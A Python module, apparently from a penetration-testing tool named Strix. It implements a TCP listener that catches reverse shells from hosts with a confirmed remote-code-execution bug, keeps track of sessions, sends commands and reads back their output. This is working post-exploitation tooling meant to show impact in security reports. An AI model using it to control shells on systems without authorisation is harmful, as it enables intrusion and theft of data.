"""Host-side reverse-shell listener + session registry — demonstrate RCE impact.

The probes confirm an RCE-class bug; this catches the shell it yields and drives
it, so a report shows ``id`` / ``whoami`` / a read secret instead of just
"RCE confirmed". A pure-stdlib TCP listener binds a port on the box running
Strix; a per-connection reader thread buffers output; tools write commands and
drain output. No sandbox dependency, so it is testable over loopback.

# ponytail: raw TCP, no PTY. Line-oriented shells (bash -i, nc) work; full-screen
# TUIs (vim, top) don't. Add a PTY upgrade helper if an engagement needs it.
"""

from __future__ import annotations

import contextlib
import socket
import threading
import time
import uuid
from dataclasses import dataclass, field


_lock = threading.RLock()
_listeners: dict[int, _Listener] = {}
_sessions: dict[str, _Session] = {}


@dataclass
class _Session:
    id: str
    sock: socket.socket
    addr: str
    port: int
    connected_at: float
    buf: bytearray = field(default_factory=bytearray)
    alive: bool = True
    _buf_lock: threading.Lock = field(default_factory=threading.Lock)

    def _read_loop(self) -> None:
        try:
            while self.alive:
                data = self.sock.recv(8192)
                if not data:
                    break
                with self._buf_lock:
                    self.buf.extend(data)
        except OSError:
            pass
        finally:
            self.alive = False

    def drain(self) -> str:
        with self._buf_lock:
            out = self.buf.decode("utf-8", errors="replace")
            self.buf.clear()
        return out

    def send(self, data: str) -> None:
        self.sock.sendall(data.encode("utf-8"))

    def close(self) -> None:
        self.alive = False
        with contextlib.suppress(OSError):
            self.sock.close()


@dataclass
class _Listener:
    port: int
    server: socket.socket
    alive: bool = True

    def _accept_loop(self) -> None:
        while self.alive:
            try:
                conn, addr = self.server.accept()
            except OSError:
                break
            sess = _Session(
                id=uuid.uuid4().hex[:8],
                sock=conn,
                addr=f"{addr[0]}:{addr[1]}",
                port=self.port,
                connected_at=time.time(),
            )
            with _lock:
                _sessions[sess.id] = sess
            threading.Thread(target=sess._read_loop, daemon=True).start()

    def close(self) -> None:
        self.alive = False
        with contextlib.suppress(OSError):
            self.server.close()


def start_listener(port: int, bind_host: str = "0.0.0.0") -> dict[str, object]:
    with _lock:
        if port in _listeners and _listeners[port].alive:
            return {"success": True, "port": port, "note": "listener already running"}
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((bind_host, port))
        server.listen(8)
    except OSError as e:
        return {"success": False, "error": f"cannot bind {bind_host}:{port}: {e}"}
    listener = _Listener(port=port, server=server)
    threading.Thread(target=listener._accept_loop, daemon=True).start()
    with _lock:
        _listeners[port] = listener
    return {"success": True, "port": port, "bind_host": bind_host}


def list_shells() -> list[dict[str, object]]:
    with _lock:
        out = []
        for s in _sessions.values():
            with s._buf_lock:
                pending = len(s.buf)
            out.append(
                {
                    "session_id": s.id,
                    "remote": s.addr,
                    "listener_port": s.port,
                    "alive": s.alive,
                    "pending_bytes": pending,
                    "age_s": round(time.time() - s.connected_at, 1),
                }
            )
        return out


def read_shell(session_id: str, timeout: float = 2.0) -> dict[str, object]:
    sess = _sessions.get(session_id)
    if sess is None:
        return {"success": False, "error": f"no session {session_id}"}
    deadline = time.time() + max(0.0, timeout)
    # Poll until some output is buffered or the wait elapses (output arrives async).
    while time.time() < deadline:
        with sess._buf_lock:
            if sess.buf:
                break
        if not sess.alive:
            break
        time.sleep(0.1)
    return {"success": True, "session_id": session_id, "output": sess.drain(), "alive": sess.alive}


def shell_exec(session_id: str, command: str, read_timeout: float = 3.0) -> dict[str, object]:
    sess = _sessions.get(session_id)
    if sess is None:
        return {"success": False, "error": f"no session {session_id}"}
    if not sess.alive:
        return {"success": False, "error": f"session {session_id} is dead"}
    sess.drain()  # clear stale banner/prompt so output maps to this command
    try:
        sess.send(command.rstrip("\n") + "\n")
    except OSError as e:
        sess.alive = False
        return {"success": False, "error": f"send failed: {e}"}
    # Collect output until it goes quiet (a short idle gap) or the timeout hits.
    deadline = time.time() + max(0.5, read_timeout)
    out = ""
    last_len = -1
    while time.time() < deadline:
        time.sleep(0.25)
        out += sess.drain()
        if len(out) == last_len and out:
            break  # no new bytes since last poll → command finished
        last_len = len(out)
    return {"success": True, "session_id": session_id, "command": command, "output": out}


def close_shell(session_id: str | None = None, port: int | None = None) -> dict[str, object]:
    with _lock:
        if session_id is not None:
            sess = _sessions.pop(session_id, None)
            if sess is None:
                return {"success": False, "error": f"no session {session_id}"}
            sess.close()
            return {"success": True, "closed": session_id}
        if port is not None:
            listener = _listeners.pop(port, None)
            if listener is None:
                return {"success": False, "error": f"no listener on {port}"}
            listener.close()
            for sid in [s.id for s in _sessions.values() if s.port == port]:
                _sessions.pop(sid).close()
            return {"success": True, "closed_listener": port}
    return {"success": False, "error": "pass session_id or port"}
